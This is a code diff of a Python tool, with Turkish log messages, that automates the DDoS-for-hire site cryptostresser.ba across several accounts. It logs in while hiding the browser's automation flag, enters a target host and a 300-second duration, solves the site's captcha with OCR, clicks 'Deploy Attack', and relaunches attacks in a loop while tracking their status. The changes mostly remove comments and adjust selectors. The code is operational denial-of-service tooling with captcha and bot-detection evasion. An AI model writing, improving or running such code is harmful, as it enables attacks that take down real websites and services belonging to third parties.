@@ -30,9 +30,7 @@ class DDoSNow:
         return accounts
     
     def solve_captcha(self, page):
-        """Captcha çöz - cryptostresser.ba için"""
         try:
-            # Deploy Attack butonuna tıkla
             deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
             deploy_btn.click()
             time.sleep(2)
@@ -41,7 +39,6 @@ class DDoSNow:
             
         while True:
             try:
-                # Captcha görselini bul
                 img = page.locator("img[alt='captcha']").first
                 if img.count() == 0:
                     time.sleep(1)
@@ -52,7 +49,6 @@ class DDoSNow:
                     time.sleep(1)
                     continue
                     
-                # OCR ile çöz
                 b64 = re.sub(r'^data:image/\w+;base64,', '', img_src)
                 text = re.sub(r'[^A-Z0-9]', '', ocr.classification(Image.open(io.BytesIO(base64.b64decode(b64)))).upper())
                 
@@ -62,21 +58,18 @@ class DDoSNow:
                     
                 logger.info(f"OCR: {text}")
                 
-                # Captcha input'u doldur
                 captcha_input = page.locator("input[name='captcha']").first
                 captcha_input.fill("")
                 time.sleep(0.5)
                 captcha_input.fill(text)
                 time.sleep(1)
                 
-                # Deploy butonuna tıkla
                 deploy_btn2 = page.locator("button[type='submit'].btn-confirm").first
                 deploy_btn2.click()
                 time.sleep(3)
                 
-                # Hata kontrolü
                 if page.locator("text=Invalid captcha").count() > 0:
-                    logger.info(f"Yanlış captcha: {text}, tekrar deneniyor...")
+                    logger.info(f"Yanlış captcha: {text}")
                     captcha_input.fill("")
                     time.sleep(1)
                     continue
@@ -106,7 +99,7 @@ class DDoSNow:
                     page = ctx.new_page()
                     page.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined})")
                     
-                    # ---- LOGIN ----
+                    # LOGIN
                     logger.info(f"[{user}] Giriş yapılıyor...")
                     page.goto(f"{self.base_url}/login", timeout=60000)
                     page.wait_for_load_state("networkidle", timeout=30000)
@@ -117,7 +110,7 @@ class DDoSNow:
                     page.click("button[type='submit']")
                     time.sleep(3)
                     
-                    # ---- HUB ----
+                    # HUB
                     logger.info(f"[{user}] Hub sayfasına gidiliyor...")
                     page.goto(f"{self.base_url}/hub", timeout=60000)
                     page.wait_for_load_state("networkidle", timeout=30000)
@@ -130,16 +123,14 @@ class DDoSNow:
                     
                     logger.info(f"[{user}] Giriş başarılı!")
                     
-                    # ---- ANA SALDIRI DÖNGÜSÜ ----
+                    # ANA DÖNGÜ
                     while self.running.get(user, False):
                         try:
-                            # Hedef URL - name="hub.0.host"
-                            target_input = page.locator("input[name='hub.0.host']").first
-                            target_input.fill(target, timeout=10000)
+                            # Hedef URL - name ile bul
+                            page.locator("input[name='hub.0.host']").first.fill(target, timeout=10000)
                             
-                            # Süre - slider id="hub.0.time", max 300
-                            time_input = page.locator("input#hub.0.time").first
-                            time_input.fill("300", timeout=5000)
+                            # Süre - CSS selector ile (id'de nokta var)
+                            page.locator("input[id='hub.0.time']").first.fill("300", timeout=5000)
                             
                             # Captcha çöz
                             logger.info(f"[{user}] Captcha çözülüyor...")
@@ -154,7 +145,6 @@ class DDoSNow:
                             # Süre takibi
                             while self.running.get(user, False):
                                 try:
-                                    # Badge kontrolü
                                     badge = page.locator(".accordion-button .badge").first
                                     if badge.count() > 0:
                                         t = badge.text_content().strip()
@@ -163,7 +153,6 @@ class DDoSNow:
                                             logger.info(f"[{user}] Süre doldu!")
                                             break
                                     else:
-                                        # Running kontrolü
                                         running = page.locator(".stats-content .badge:has-text('Running')").first
                                         if running.count() == 0:
                                             logger.info(f"[{user}] Attack bitti!")
@@ -206,21 +195,19 @@ class DDoSNow:
             logger.info(f"[{a['user']}] Başlatıldı -> {a['target']}")
             time.sleep(2)
         
-        # Durum raporu
         while True:
             time.sleep(60)
             logger.info("="*50)
             logger.info("AKTİF HESAPLAR:")
             for u, r in self.running.items():
                 target = next((a["target"] for a in self.accounts if a["user"] == u), "?")
-                logger.info(f"  {u}: {'✅ Çalışıyor' if r else '⛔ Durduruldu'} -> {target}")
+                logger.info(f"  {u}: {'CALISIYOR' if r else 'DURDURULDU'} -> {target}")
             logger.info("="*50)
 
 if __name__ == "__main__":
     print("""
     ╔═══════════════════════════════════════════╗
     ║   CRYPTOSTRESSER.BA - DDOS AUTOMATION     ║
-    ║   Multi-Account Attack System             ║
     ╚═══════════════════════════════════════════╝
     """)
     DDoSNow().start()
